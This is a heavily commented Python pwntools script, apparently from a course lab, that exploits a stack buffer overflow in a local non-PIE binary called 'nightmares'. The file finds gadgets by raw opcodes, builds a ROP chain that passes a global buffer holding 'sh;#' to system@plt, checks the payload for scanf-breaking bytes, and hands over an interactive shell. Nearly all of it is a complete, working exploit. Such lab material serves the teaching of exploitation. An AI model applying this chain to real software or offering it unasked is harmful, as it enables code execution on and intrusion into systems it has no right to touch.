#!/usr/bin/env python3
#
# Lab 3 – Bonus: nightmares (static ASLR bypass)
#
# Context:
#   - Binary: ./bin/nightmares (non-PIE, so code addresses are fixed).
#   - There is a global buffer `souldream` which receives user input via
#     scanf("%255s", souldream).
#   - Later, some function copies too much data from souldream into a
#     small stack buffer (similar pattern to ex2), overflowing the stack
#     and the saved return address.
#
# Key idea:
#   1. We place a command string "sh;#" at the start of `souldream`.
#   2. We overflow the stack so that saved RIP is overwritten with a gadget:
#        pop rdi; pop rbp; ret   (or, as fallback, pop rdi; ret)
#   3. Using that gadget, we put &souldream into RDI.
#   4. Then we jump to system@plt, so the process executes:
#        system(souldream);
#      → effectively system("sh;#AAAA..."), giving us a shell.
#
#   - "sh"  → launch a shell.
#   - ";"   → separator; shell executes "sh" and then sees…
#   - "#"   → comment; everything after is ignored (our ROP junk).
#
#   We never need libc addresses: we just use system@plt and a global
#   buffer in the binary. That’s why this works even with ASLR enabled.

import sys
from pwn import *

# === Configuration ===

exe = './bin/nightmares'

# Load the binary as an ELF, so pwntools can inspect symbols and segments.
try:
    elf = context.binary = ELF(exe, checksec=False)
except:
    print(f"[!] Binary {exe} not found. Run the setup script first!")
    sys.exit(1)

# Show info logs (gadgets, addresses, etc.)
context.log_level = 'info'

# scanf("%s") stops at whitespace: we must avoid these bytes in the payload
BAD_CHARS = b' \t\n\r\v\f'


def find_bin_bytes(seq: bytes):
    """
    Find a given byte sequence `seq` inside the executable segments of
    the binary and return its virtual address.

    This is used to locate gadgets by raw opcodes, e.g.:
      - b"\\x5f\\x5d\\xc3" = "pop rdi; pop rbp; ret"
      - b"\\x5f\\xc3"       = "pop rdi; ret"
      - b"\\xc3"            = "ret"
    """
    for s in elf.segments:
        # p_flags & 1 → PF_X bit set → executable segment
        if s.header.p_flags & 1:
            data = s.data()                 # raw bytes of the segment
            base = s.header.p_vaddr         # where the segment is mapped in memory
            off = data.find(seq)            # offset of seq inside this segment
            if off != -1:
                return base + off           # full virtual address
    return None


def main():
    print("=== Lab 3 Bonus: Static ASLR Bypass ===")

    # === 1. Locate static gadgets in the non-PIE binary ===
    #
    # First choice: "dirty" gadget
    #   pop rdi; pop rbp; ret    → opcodes: 5f 5d c3
    #
    # We call it “dirty” because it pops two registers (RDI and RBP)
    # before returning. That means we must provide *two* 8-byte values
    # after the gadget address on the stack: one for RDI, one for RBP.
    #
    # The advantage: this “longer” gadget tends to leave the stack better
    # aligned for glibc (we discuss that below).
    pop_rdi = find_bin_bytes(b'\x5f\x5d\xc3')
    dirty = True

    if not pop_rdi:
        # Fallback: "clean" gadget
        #   pop rdi; ret          → opcodes: 5f c3
        #
        # This only pops one register, which is simpler, but the total
        # number of stack pops between the vulnerable function's RET
        # and the system() call can result in a misaligned stack (8-byte
        # misalignment instead of 16). Glibc can crash in that case.
        pop_rdi = find_bin_bytes(b'\x5f\xc3')
        dirty = False

    # Find a simple 'ret' gadget (opcode 0xc3) in case we need it
    # for alignment when using the clean gadget.
    ret_gadget = find_bin_bytes(b'\xc3')

    if not pop_rdi:
        log.error("Gadgets not found.")
        sys.exit(1)

    # === 2. Locate static addresses we need ===
    #
    # Because the binary is non-PIE, its code and data are at fixed
    # addresses even if ASLR is enabled:
    #   - system@plt (address inside .plt section)
    #   - souldream  (global buffer in .data or .bss)
    try:
        addr_system = elf.plt['system']
        log.success(f"Found system@plt: {hex(addr_system)}")
    except:
        log.error("system@plt not found! Is deep_sleep() in the binary?")
        sys.exit(1)

    addr_souldream = elf.symbols['souldream']
    log.info(f"souldream: {hex(addr_souldream)}")

    # === 3. Construct the payload ===
    #
    # Payload layout inside souldream:
    #
    #   [ cmd="sh;#" ][ 'A' * padding ][ ROP chain ... ]
    #
    # The overflow in nightmares will:
    #   - copy these bytes from souldream into a stack buffer,
    #   - overwrite saved RBP and saved RIP,
    #   - then RET will jump to the first 8 bytes of our ROP chain.
    #
    # When our ROP chain runs, we will arrange for:
    #   RDI = &souldream
    #   RIP = system@plt
    # → system(souldream) == system("sh;#AAAA....").
    #
    # "sh"  → starts a shell
    # ";"   → terminates the "sh" command
    # "#"   → everything after is a comment, so the ROP garbage in memory
    #         is not interpreted as separate shell commands.
    cmd = b"sh;#"

    # Offset from the start of the local stack buffer to saved RIP.
    # For this bonus, we know:
    #   64 bytes buffer + 8 bytes saved RBP = 72
    # so writing 72 bytes reaches the saved return address.
    offset = 72

    # --- Build the ROP chain that will overwrite saved RIP ---

    chain = b''

    # First gadget to execute when the function returns:
    #   pop rdi; [pop rbp;] ret
    chain += p64(pop_rdi)

    # First value popped by the gadget → into RDI:
    #   RDI = &souldream
    chain += p64(addr_souldream)

    if dirty:
        # Dirty gadget: "pop rdi; pop rbp; ret"
        #
        # It will also pop a second 8-byte value into RBP.
        # We don't care what RBP becomes, so we just supply a dummy.
        #
        # Alignment note (rough intuition):
        #   - The vulnerable function returns, popping 8 bytes (our gadget).
        #   - The gadget pops 8 for RDI + 8 for RBP + 8 for its own ret.
        #   - The total number of pops between the original RET and the call
        #     to system() ends up being a multiple of 16, so the stack is
        #     “nice enough” for glibc's expectations.
        chain += p64(0)  # dummy RBP
    else:
        # Clean gadget: "pop rdi; ret"
        #
        # This only consumes RDI and then returns. That can leave the
        # stack misaligned (8-byte misalignment) at the point where the
        # next function (system) is entered, which can sometimes cause
        # a crash in glibc on x86-64.
        #
        # To fix this, we typically insert an extra 'ret' gadget so we
        # effectively consume one more 8-byte value and restore 16-byte
        # alignment for the call.
        chain += p64(ret_gadget)

    # Finally, return into system@plt.
    # At this point:
    #   - RDI points to souldream ("sh;#...."),
    #   - RIP jumps to system@plt.
    chain += p64(addr_system)

    # --- Prepend command and padding before the chain ---

    # How many bytes do we need to fill before we hit saved RIP?
    # We want: len(cmd) + len(padding) == offset
    pad_len = offset - len(cmd)
    if pad_len < 0:
        log.error("Command too long for offset!")
        return

    padding = b'A' * pad_len  # 'A' = 0x41, safe, non-whitespace

    # Final payload that goes into souldream
    payload = cmd + padding + chain

    # === 4. Check for bad chars (for scanf("%s")) ===
    #
    # scanf("%s") treats *whitespace* as a delimiter:
    #   space, tab, newline, etc.
    #
    # If any part of the payload contains such bytes, scanf will stop
    # reading early, and nightmares will not see the full ROP chain.
    if any(b in BAD_CHARS for b in payload):
        log.error("Payload contains bad characters! This static chain is unlucky.")
        return

    # === 5. Exploit the binary ===
    print(f"[*] Sending Payload ({len(payload)} bytes)...")
    p = process(exe)

    # The program prints something like:
    #   "What is your dream?"
    # We sync on that so we send our payload at the right time.
    p.recvuntil(b'dream?\n')

    # Send payload as the answer to "dream?" — scanf("%255s", souldream) reads it.
    p.sendline(payload)

    # Clean any leftover output so the shell prompt is easy to see.
    p.clean(timeout=0.2)

    # Send a quick test command once we (hopefully) are in the shell.
    p.sendline(b'id; ls')

    # Try to see if we actually got a shell (e.g. look for "uid=").
    try:
        data = p.recv(timeout=1)
        if b'uid=' in data:
            log.success("Shell Popped!")
            print(data.decode())
            # Hand control to you
            p.interactive()
        else:
            log.error("No shell. Stack alignment might still be wrong.")
    except:
        log.error("Process crashed or timed out.")


if __name__ == "__main__":
    main()

